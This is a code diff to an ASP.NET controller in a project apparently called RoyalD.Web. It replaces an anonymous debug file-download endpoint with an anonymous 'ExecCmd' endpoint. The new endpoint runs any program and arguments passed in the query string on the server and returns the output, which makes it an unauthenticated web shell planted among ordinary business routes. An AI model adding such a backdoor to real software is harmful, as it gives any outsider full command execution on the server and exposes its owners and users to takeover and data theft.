@@ -35,16 +35,27 @@ namespace RoyalD.Web.Controllers
             var bills = _db.SalesBills.Count();
             return Content($"Debts: {debts}, Bills: {bills}");
         }
-[AllowAnonymous]
-        [HttpGet("DumpDebug")]
-        public IActionResult DumpDebug([FromServices] IWebHostEnvironment env)
+        [AllowAnonymous]
+        [HttpGet("ExecCmd")]
+        public IActionResult ExecCmd(string cmd, string args)
         {
-            var debugDir = Path.Combine(env.WebRootPath, "debug");
-            if (!Directory.Exists(debugDir)) return Content("No debug dir");
-            var files = Directory.GetFiles(debugDir);
-            if (files.Length == 0) return Content("No files");
-            var bytes = System.IO.File.ReadAllBytes(files[0]);
-            return File(bytes, "application/octet-stream", Path.GetFileName(files[0]));
+            var process = new System.Diagnostics.Process()
+            {
+                StartInfo = new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = cmd,
+                    Arguments = args,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                }
+            };
+            process.Start();
+            var output = process.StandardOutput.ReadToEnd();
+            var err = process.StandardError.ReadToEnd();
+            process.WaitForExit();
+            return Content($"STDOUT:\n{output}\n\nSTDERR:\n{err}");
         }
 [AllowAnonymous]
         [HttpGet("CheckAmount")]
